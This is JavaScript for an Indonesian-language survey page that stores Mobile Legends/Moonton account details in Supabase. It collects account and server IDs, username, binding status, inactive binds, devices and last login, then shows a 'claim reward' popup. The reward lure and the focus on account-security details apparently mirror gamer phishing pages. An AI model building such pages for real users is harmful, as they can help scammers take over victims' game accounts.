// KONFIGURASI SUPABASE - GANTI DENGAN PUNYA ANDA
const SUPABASE_URL = 'https://your-project-id.supabase.co';
const SUPABASE_ANON_KEY = 'your-anon-key';
const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// Navigasi slide
let currentSlide = 1;
function showSlide(n) {
  document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
  const slide = document.getElementById('slide'+n);
  if(slide) slide.classList.add('active');
  if(n === 'reward') document.getElementById('rewardPage').classList.add('active');
  currentSlide = n;
}
function nextSlide(from) {
  if(!validateSlide(from)) return;
  if(from === 4) {
    submitSurvey(); // akan pindah ke reward setelah simpan
  } else {
    showSlide(from+1);
  }
}
function prevSlide(from) { showSlide(from-1); }

function validateSlide(slideNum) {
  // validasi sederhana: cek required fields tidak kosong
  if(slideNum === 1) {
    if(!document.getElementById('layanan').value) { alert('Pilih layanan'); return false; }
  }
  if(slideNum === 2) {
    if(!document.getElementById('platform_kenal').value) { alert('Pilih platform'); return false; }
    if(!document.getElementById('tahun_gabung').value) { alert('Pilih tahun'); return false; }
    if(!document.getElementById('negara').value.trim()) { alert('Isi negara'); return false; }
  }
  if(slideNum === 3) {
    if(!document.getElementById('v2l').value) { alert('Pilih V2L'); return false; }
    if(!document.getElementById('jumlah_device').value) { alert('Pilih jumlah device'); return false; }
  }
  if(slideNum === 4) {
    if(!document.getElementById('id_akun').value) { alert('ID akun wajib'); return false; }
    if(!document.getElementById('id_server').value) { alert('ID server wajib'); return false; }
  }
  return true;
}

// Isi tahun otomatis
window.onload = function() {
  const tahunSelect = document.getElementById('tahun_gabung');
  for(let i=2017; i<=2026; i++) {
    const opt = document.createElement('option'); opt.value=i; opt.textContent=i; tahunSelect.appendChild(opt);
  }
  showSlide(1);
  document.getElementById('submitSurveyBtn').addEventListener('click', (e) => {
    e.preventDefault();
    if(validateSlide(4)) submitSurvey();
  });
  setupRewardListeners();
};

// Simpan survei ke Supabase
async function submitSurvey() {
  const data = {
    layanan: document.getElementById('layanan').value,
    platform_kenal: document.getElementById('platform_kenal').value,
    tahun_gabung: document.getElementById('tahun_gabung').value,
    negara: document.getElementById('negara').value,
    bind_tersedia: document.getElementById('bind_tersedia').value,
    bind_nonaktif: document.getElementById('bind_nonaktif').value,
    v2l: document.getElementById('v2l').value,
    jumlah_device: document.getElementById('jumlah_device').value,
    terakhir_login: document.getElementById('terakhir_login').value,
    id_akun: document.getElementById('id_akun').value,
    id_server: document.getElementById('id_server').value,
    level_akun: document.getElementById('level_akun').value,
    nama_akun: document.getElementById('nama_akun').value,
    level_kolektor: document.getElementById('level_kolektor').value,
    total_skin: document.getElementById('total_skin').value,
    total_hero: document.getElementById('total_hero').value,
    hero_terakhir: document.getElementById('hero_terakhir').value,
    rank_tertinggi: document.getElementById('rank_tertinggi').value,
    username_moonton: document.getElementById('username_moonton').value,
  };
  const { error } = await supabase.from('survei').insert([data]);
  if(error) { alert('Gagal menyimpan: '+error.message); return; }
  showSlide('reward');
}

// Reward & Popup
function setupRewardListeners() {
  document.getElementById('claimRewardBtn').addEventListener('click', () => {
    document.getElementById('verifyPopup').classList.add('active');
  });
  document.getElementById('cancelVerifyBtn').addEventListener('click', () => {
    document.getElementById('verifyPopup').classList.remove('active');
  });
  document.getElementById('confirmVerifyBtn').addEventListener('click', async () => {
    const idAkun = document.getElementById('pop_id_akun').value;
    const idServer = document.getElementById('pop_id_server').value;
    const platform = document.getElementById('pop_platform').value;
    if(!idAkun || !idServer || !platform) { alert('Lengkapi data verifikasi'); return; }
    const { error } = await supabase.from('reward_klaim').insert([
      { id_akun: idAkun, id_server: idServer, platform }
    ]);
    if(error) { alert('Gagal klaim: '+error.message); return; }
    document.getElementById('verifyPopup').classList.remove('active');
    document.getElementById('successPopup').classList.add('active');
  });
  document.getElementById('closeSuccessBtn').addEventListener('click', () => {
    document.getElementById('successPopup').classList.remove('active');
  });
}
